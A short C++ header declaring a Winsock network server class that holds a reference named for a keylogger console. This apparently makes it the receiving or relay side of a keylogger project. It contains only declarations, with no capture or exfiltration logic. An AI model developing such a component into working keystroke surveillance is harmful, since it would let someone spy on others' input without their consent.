#pragma once

#include <winsock2.h>
#include <iostream> 
#include <string>
#include <process.h>
#include <thread>
#include "ConsoleLogger.h"
#pragma comment(lib,"ws2_32.lib")

class Server
{
private:
	int _port;
	const char* _ip;
	
	SOCKET _sock;
	CConsoleLoggerEx & _keyloggerConsole;
public:
	bool gotConnection = false;
	SOCKET client;
	Server(int port, const char * ip, CConsoleLoggerEx & console) : _port(port), _ip(ip), _keyloggerConsole(console)
	{
	}

	void lostConnection();
	int Server::threadingClient();
	void sender(const std::string& str) const;
	int listener();
	
};


